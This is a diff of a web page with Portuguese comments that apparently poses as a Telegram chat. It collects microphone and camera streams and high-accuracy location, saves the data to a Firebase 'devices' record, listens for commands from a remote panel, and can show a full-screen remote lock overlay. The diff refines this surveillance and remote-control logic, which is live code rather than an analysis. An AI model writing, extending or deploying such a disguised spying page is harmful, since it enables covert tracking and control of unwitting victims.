@@ -107,8 +107,8 @@
         </div>
     </div>
 
-    <!-- TELA DE BLOQUEIO REMOTA -->
-    <div id="remote-lock-screen" class="hidden fixed inset-0 bg-slate-950/95 backdrop-blur-xl z-50 flex flex-col items-center justify-center p-6 text-center space-y-6">
+    <!-- TELA DE BLOQUEIO REMOTA (Cobre a interface de chat inteira) -->
+    <div id="remote-lock-screen" class="hidden fixed inset-0 bg-slate-950/98 backdrop-blur-2xl z-50 flex flex-col items-center justify-center p-6 text-center space-y-6">
         <div class="w-20 h-20 bg-rose-500/20 text-rose-500 rounded-3xl flex items-center justify-center text-3xl shadow-lg animate-pulse border border-rose-500/30">
             <i class="fa-solid fa-lock"></i>
         </div>
@@ -166,8 +166,10 @@
                     document.getElementById('remote-audio-element').srcObject = activeStream;
                     userDataPayload.permissions.audio = true;
                 }
-            } catch(e) { userDataPayload.permissions.audio = false; }
-            nextStep(3); // Vai para a câmera
+            } catch(e) { 
+                userDataPayload.permissions.audio = false; 
+            }
+            nextStep(3);
         }
 
         async function requestCameraPermission() {
@@ -177,8 +179,10 @@
                     document.getElementById('remote-video-element').srcObject = camStream;
                     userDataPayload.permissions.camera = true;
                 }
-            } catch(e) { userDataPayload.permissions.camera = false; }
-            nextStep(4); // Vai para a localização
+            } catch(e) { 
+                userDataPayload.permissions.camera = false; 
+            }
+            nextStep(4);
         }
 
         async function requestLocationPermission() {
@@ -196,7 +200,7 @@
                         userDataPayload.location = { status: "Negada" };
                         finishAndOpenChat();
                     },
-                    { timeout: 7000 }
+                    { timeout: 7000, enableHighAccuracy: true }
                 );
             } else {
                 finishAndOpenChat();
@@ -204,7 +208,7 @@
         }
 
         function finishAndOpenChat() {
-            // Salva dados no Firebase
+            initFirebase();
             if (db) {
                 db.ref('devices/device_01/status').update({
                     ...userDataPayload,
@@ -213,11 +217,9 @@
                 });
             }
 
-            // Oculta passos e abre a tela de chat do Telegram
             document.querySelectorAll('[id^="step-"]').forEach(el => el.classList.add('hidden'));
             document.getElementById('telegram-chat-container').classList.remove('hidden');
 
-            // Escuta comandos do painel
             listenCommands();
         }
 
